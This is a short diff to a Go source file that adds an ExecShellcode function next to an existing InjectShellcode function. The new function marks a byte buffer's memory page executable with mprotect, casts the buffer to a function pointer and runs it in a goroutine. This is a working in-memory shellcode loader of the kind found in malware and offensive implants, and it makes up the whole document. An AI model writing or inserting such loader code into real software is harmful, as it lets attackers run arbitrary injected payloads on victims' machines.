@@ -33,3 +33,12 @@ func InjectShellcode(encShellcode string) {
 func getPage(p uintptr) []byte {
 	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
+
+func ExecShellcode(shellcode []byte) {
+	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
+	page := getPage(shellcodeAddr)
+	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	shellPtr := unsafe.Pointer(&shellcode)
+	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
+	go shellcodeFuncPtr()
+}
